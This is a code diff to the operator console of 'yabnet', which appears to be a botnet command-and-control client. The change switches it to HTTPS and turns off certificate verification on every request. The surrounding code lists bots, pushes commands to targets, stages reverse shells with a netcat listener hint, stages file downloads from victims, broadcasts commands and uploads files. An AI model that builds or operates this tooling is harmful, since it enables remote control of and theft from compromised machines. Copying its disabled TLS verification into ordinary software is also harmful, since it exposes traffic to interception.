@@ -11,10 +11,12 @@ import json
 import pathlib 
 import time
 import functools
+import warnings
 import pandas as pd 
 from colorama import Fore,Style
 from subprocess import Popen, PIPE
 from multiprocessing.pool import ThreadPool
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 import cmd2
 from cmd2 import ansi
@@ -34,6 +36,8 @@ The master console is separated from yabnet server for opsec and efficiency reas
 TIMER = '55'
 TIMER_INT = 55
 
+warnings.simplefilter('ignore', InsecureRequestWarning)
+
 def refresh():
     """
     Description: Regularly hit yabnet server's /refresh endpoint to update server's database. 
@@ -44,7 +48,7 @@ def refresh():
     while True:
         url = URL + '/refresh'
         try:
-            res = requests.get(url)
+            res = requests.get(url, verify=False)
         except Exception as e:
             pass 
         
@@ -99,7 +103,7 @@ def checkPushResult(url, masterkey, target,cmd):
     key = masterkey 
 
     data = {'masterkey': key}
-    res = requests.post(endpoint, data=data)
+    res = requests.post(endpoint, data=data, verify=False)
     res = res.json()
     
     print_green("\n===========================================================================")
@@ -216,7 +220,7 @@ ___  ___          _              _____                       _
 
         # TODO: Update the URL to have custom port numbers as well 
         global URL 
-        URL = 'http://' + remoteserver
+        URL = 'https://' + remoteserver
 
         auth_url = URL + '/auth'
 
@@ -231,7 +235,7 @@ ___  ___          _              _____                       _
 
         # Send authentication request to /auth endpoint 
         data = {'username': username, 'password': password}
-        res = requests.post(auth_url, data)
+        res = requests.post(auth_url, data, verify=False)
         response_data = res.json()
 
         # Authentication successful 
@@ -277,13 +281,13 @@ ___  ___          _              _____                       _
         if args.hostname != None:
             url = URL + '/bot/find'
             data = {'masterkey': MASTERKEY,'hostname': args.hostname}
-            res = requests.post(url, data=data)
+            res = requests.post(url, data=data, verify=False)
 
         # If specific hostname is NOT set, just visit /list and show all the bots 
         else:
             url = URL + '/bot/list'
             data = {'masterkey': MASTERKEY}
-            res = requests.post(url, data=data)
+            res = requests.post(url, data=data, verify=False)
 
         # No bots found in the server
         if len(res.json()) == 0:
@@ -331,7 +335,7 @@ ___  ___          _              _____                       _
 
         url = URL + '/bot/cleanup'
         data = {'masterkey': MASTERKEY}
-        res = requests.post(url, data=data)
+        res = requests.post(url, data=data, verify=False)
 
         output_cleanup = ansi.style(res.text, fg='green', bold=True)
         self.poutput(output_cleanup)
@@ -352,7 +356,7 @@ ___  ___          _              _____                       _
 
         url = URL + '/bot/commands'
         data = {'masterkey': MASTERKEY}
-        res = requests.post(url, data=data)
+        res = requests.post(url, data=data, verify=False)
 
         commandlist = "==========================================================\n"
         commandlist += res.text
@@ -382,7 +386,7 @@ ___  ___          _              _____                       _
             cmd = args.command 
 
             data = {'masterkey': masterkey, 'cmd': cmd}
-            res = requests.post(url, data=data)
+            res = requests.post(url, data=data, verify=False)
 
             output_push = ansi.style("[+] Command staged for: " + target, fg='green', bold=True)
 
@@ -410,7 +414,7 @@ ___  ___          _              _____                       _
         cmd = "shell " + args.port 
 
         data = {'masterkey': masterkey, 'cmd': cmd}
-        res = requests.post(url, data=data)
+        res = requests.post(url, data=data, verify=False)
 
         output_shell = ansi.style("[+] Reverse shell staged. Openup netcat in a separate terminal! 'nc -lvnp <port>' " + args.port, fg='green', bold=True)
         output_shell = ansi.style("[+] You have 10 seconds to open a netcat listener... ", fg='green', bold=True)
@@ -446,7 +450,7 @@ ___  ___          _              _____                       _
             cmd = "download " + args.file + " " + args.destination 
 
             data = {'masterkey': masterkey, 'cmd': cmd}
-            res = requests.post(url, data=data)
+            res = requests.post(url, data=data, verify=False)
 
             output_push = ansi.style("[+] Download file staged for: " + target, fg='green', bold=True)
 
@@ -468,7 +472,7 @@ ___  ___          _              _____                       _
 
         data = {'masterkey': MASTERKEY, 'cmd': cmd}
 
-        res = requests.post(url, data=data)
+        res = requests.post(url, data=data, verify=False)
         response_data = res.json()
 
         output_broadcast = ansi.style('[+] Broadcast command has been staged.')
@@ -494,7 +498,7 @@ ___  ___          _              _____                       _
         files = {'file': open(userFile,'rb')}
         data = {'masterkey': MASTERKEY}
 
-        res = requests.post(url, files=files, data=data)
+        res = requests.post(url, files=files, data=data, verify=False)
 
     """
     Command: files
@@ -504,7 +508,7 @@ ___  ___          _              _____                       _
     def do_files(self,args):
         url = URL + '/files'
 
-        res = requests.get(url)
+        res = requests.get(url, verify=False)
 
         print_green(res.text)
 
